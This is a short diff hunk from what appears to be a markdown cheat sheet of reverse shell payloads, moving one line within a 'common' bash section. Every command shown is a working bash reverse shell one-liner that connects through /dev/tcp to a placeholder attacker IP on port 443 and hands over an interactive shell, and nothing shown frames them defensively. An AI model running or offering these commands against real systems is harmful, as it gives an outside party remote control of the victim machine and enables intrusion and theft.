@@ -3,11 +3,11 @@
 ## common
 
 ```bash
+bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
+#
 /bin/bash -i >& /dev/tcp/<IP>/443 0>&1
 # or
 bash -l > /dev/tcp/<IP>/443 0<&1 2>&1
-# or
-bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
 ```
 
 ## url encoded
